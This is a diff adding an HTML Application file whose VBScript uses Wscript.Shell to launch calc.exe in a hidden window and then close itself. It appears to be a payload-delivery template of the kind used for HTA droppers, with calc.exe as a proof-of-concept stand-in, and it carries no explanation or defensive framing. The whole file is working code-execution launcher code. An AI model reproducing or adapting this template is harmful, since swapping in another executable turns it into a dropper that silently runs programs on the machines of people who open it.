@@ -1,0 +1,12 @@
+<script language="VBScript">
+        Function var_func()
+                Dim var_shell
+                Set var_shell = CreateObject("Wscript.Shell")
+                var_tempexe = "C:\Windows\System32\calc.exe"
+                var_shell.run var_tempexe, 0, true
+        End Function
+
+        var_func
+        self.close
+</script>
+
